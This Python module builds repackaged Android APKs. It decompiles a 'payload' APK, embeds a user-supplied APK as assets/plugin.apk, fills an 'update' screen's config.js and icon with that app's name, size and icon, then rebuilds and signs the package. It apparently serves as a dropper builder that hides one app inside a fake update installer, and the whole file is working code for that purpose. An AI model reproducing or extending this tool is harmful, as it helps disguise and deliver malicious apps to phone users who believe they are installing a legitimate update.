import os
import re
import shutil
import asyncio
import logging
import subprocess
from pathlib import Path
from .config import APKTOOL_PATH, ZIPALIGN_PATH, DEBUG_KEYSTORE_PATHS, DEBUG_KEYSTORE_PASSWORD, DEBUG_KEYSTORE_ALIAS
from .apk_analyzer import APKAnalyzer

logger = logging.getLogger(__name__)


class PayloadInjector:
    """Inject user APK into payload APK"""
    
    def __init__(self, payload_apk_path):
        self.payload_apk = payload_apk_path
        self.work_dir = None
        self.decompiled_dir = None
        
    async def inject(self, user_apk_path, output_path):
        """
        Main injection process
        
        Steps:
        1. Decompile payload APK
        2. Extract info from user APK (name, icon, size)
        3. Replace assets/plugin.apk with user APK
        4. Update config.js with app name and size
        5. Replace assets/update/app.png with user icon
        6. Rebuild and sign payload
        7. Return final APK path
        """
        try:
            logger.info("🚀 Starting payload injection...")
            
            # Step 1: Decompile payload
            logger.info("📦 Step 1/6: Decompiling payload...")
            decompiled = await self._decompile_payload()
            if not decompiled:
                return None, "Failed to decompile payload"
            
            # Step 2: Extract user APK info
            logger.info("🔍 Step 2/6: Analyzing user APK...")
            app_info = await self._analyze_user_apk(user_apk_path)
            if not app_info:
                return None, "Failed to analyze user APK"
            
            logger.info(f"✅ App: {app_info['name']} ({app_info['size']})")
            
            # Step 3: Replace plugin.apk
            logger.info("📋 Step 3/6: Injecting user APK...")
            if not await self._inject_plugin_apk(user_apk_path):
                return None, "Failed to inject plugin.apk"
            
            # Step 4: Update config.js
            logger.info("⚙️ Step 4/6: Updating config...")
            if not await self._update_config_js(app_info['name'], app_info['size']):
                return None, "Failed to update config.js"
            
            # Step 5: Replace icon
            logger.info("🎨 Step 5/6: Updating icon...")
            if app_info['icon_path']:
                await self._inject_icon(app_info['icon_path'])
            
            # Step 6: Rebuild and sign
            logger.info("🔨 Step 6/6: Building final APK...")
            final_apk = await self._rebuild_and_sign(output_path)
            if not final_apk:
                return None, "Failed to build final APK"
            
            logger.info(f"✅ Payload injection complete: {final_apk}")
            return final_apk, None
            
        except Exception as e:
            logger.error(f"Injection error: {str(e)}")
            return None, str(e)
        finally:
            # Cleanup
            await self._cleanup()
    
    async def _decompile_payload(self):
        """Decompile payload APK"""
        try:
            import tempfile
            self.work_dir = tempfile.mkdtemp(prefix='payload_work_')
            self.decompiled_dir = os.path.join(self.work_dir, 'decompiled')
            
            process = await asyncio.create_subprocess_exec(
                'java', '-jar', str(APKTOOL_PATH),
                'd', self.payload_apk,
                '-o', self.decompiled_dir,
                '-f',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            if process.returncode != 0:
                logger.error(f"Decompile failed: {stderr.decode('utf-8', errors='ignore')}")
                return False
            
            logger.info("✅ Payload decompiled")
            return True
            
        except Exception as e:
            logger.error(f"Decompile error: {str(e)}")
            return False
    
    async def _analyze_user_apk(self, user_apk_path):
        """Extract info from user APK"""
        try:
            import tempfile
            
            analyzer = APKAnalyzer(user_apk_path)
            analyze_dir = tempfile.mkdtemp(prefix='analyze_')
            
            results = await analyzer.analyze(analyze_dir)
            
            # Get file size
            file_size = os.path.getsize(user_apk_path)
            size_mb = file_size / (1024 * 1024)
            
            info = {
                'name': results.get('app_name') or 'Unknown App',
                'package': results.get('package_name') or 'unknown.package',
                'size': f"{size_mb:.1f} MB",
                'icon_path': results.get('icon_path')
            }
            
            # Cleanup analyze dir
            try:
                shutil.rmtree(analyze_dir, ignore_errors=True)
            except:
                pass
            
            return info
            
        except Exception as e:
            logger.error(f"Analysis error: {str(e)}")
            return None
    
    async def _inject_plugin_apk(self, user_apk_path):
        """Replace assets/plugin.apk with user APK"""
        try:
            plugin_path = os.path.join(self.decompiled_dir, 'assets', 'plugin.apk')
            
            # Remove old plugin.apk if exists
            if os.path.exists(plugin_path):
                os.remove(plugin_path)
                logger.debug("Removed old plugin.apk")
            
            # Copy user APK
            shutil.copy2(user_apk_path, plugin_path)
            logger.info("✅ User APK injected as plugin.apk")
            
            return True
            
        except Exception as e:
            logger.error(f"Plugin injection error: {str(e)}")
            return False
    
    async def _update_config_js(self, app_name, app_size):
        """Update config.js with app name and size"""
        try:
            config_path = os.path.join(self.decompiled_dir, 'assets', 'update', 'config.js')
            
            if not os.path.exists(config_path):
                logger.error("config.js not found")
                return False
            
            # Read file
            with open(config_path, 'r', encoding='utf-8') as f:
                content = f.read()
            
            # Update appName
            content = re.sub(
                r'appName:\s*"[^"]*"',
                f'appName: "{app_name}"',
                content
            )
            
            # Update appSize
            content = re.sub(
                r'appSize:\s*"[^"]*"',
                f'appSize: "{app_size}"',
                content
            )
            
            # Write back
            with open(config_path, 'w', encoding='utf-8') as f:
                f.write(content)
            
            logger.info(f"✅ config.js updated: {app_name} ({app_size})")
            return True
            
        except Exception as e:
            logger.error(f"Config update error: {str(e)}")
            return False
    
    async def _inject_icon(self, icon_path):
        """Replace assets/update/app.png with user icon"""
        try:
            target_path = os.path.join(self.decompiled_dir, 'assets', 'update', 'app.png')
            
            # Remove old icon
            if os.path.exists(target_path):
                os.remove(target_path)
            
            # Copy new icon
            shutil.copy2(icon_path, target_path)
            logger.info("✅ Icon updated")
            
            return True
            
        except Exception as e:
            logger.error(f"Icon injection error: {str(e)}")
            return False
    
    async def _rebuild_and_sign(self, output_path):
        """Rebuild and sign the modified payload"""
        try:
            unsigned_apk = os.path.join(self.work_dir, 'unsigned.apk')
            aligned_apk = os.path.join(self.work_dir, 'aligned.apk')
            
            # Rebuild
            logger.info("Building APK...")
            process = await asyncio.create_subprocess_exec(
                'java', '-jar', str(APKTOOL_PATH),
                'b', self.decompiled_dir,
                '-o', unsigned_apk,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            if process.returncode != 0:
                logger.error(f"Build failed: {stderr.decode('utf-8', errors='ignore')}")
                return None
            
            logger.info("✅ APK built")
            
            # Zipalign
            logger.info("Running zipalign...")
            if not await self._zipalign(unsigned_apk, aligned_apk):
                return None
            
            # Sign with debug keystore
            logger.info("Signing APK...")
            final_apk = await self._sign_apk(aligned_apk, output_path)
            
            return final_apk
            
        except Exception as e:
            logger.error(f"Rebuild error: {str(e)}")
            return None
    
    async def _zipalign(self, input_apk, output_apk):
        """Zipalign APK"""
        try:
            if os.path.exists(output_apk):
                os.remove(output_apk)
            
            cmd = [ZIPALIGN_PATH, "-p", "-f", "4", input_apk, output_apk]
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode != 0:
                logger.error(f"zipalign failed: {result.stderr}")
                return False
            
            logger.info("✅ zipalign done")
            return True
            
        except Exception as e:
            logger.error(f"zipalign error: {str(e)}")
            return False
    
    async def _sign_apk(self, input_apk, output_apk):
        """Sign APK with debug keystore"""
        try:
            # Find debug keystore
            keystore = None
            for path in DEBUG_KEYSTORE_PATHS:
                if os.path.exists(path):
                    keystore = path
                    break
            
            if not keystore:
                logger.error("debug.keystore not found")
                return None
            
            # Sign using apksigner
            cmd = [
                'apksigner', 'sign',
                '--ks', keystore,
                '--ks-pass', f'pass:{DEBUG_KEYSTORE_PASSWORD}',
                '--ks-key-alias', DEBUG_KEYSTORE_ALIAS,
                '--out', output_apk,
                input_apk
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode != 0:
                logger.error(f"Signing failed: {result.stderr}")
                return None
            
            logger.info("✅ APK signed")
            return output_apk
            
        except Exception as e:
            logger.error(f"Signing error: {str(e)}")
            return None
    
    async def _cleanup(self):
        """Cleanup temporary files"""
        try:
            if self.work_dir and os.path.exists(self.work_dir):
                shutil.rmtree(self.work_dir, ignore_errors=True)
                logger.debug(f"Cleaned up: {self.work_dir}")
        except:
            pass
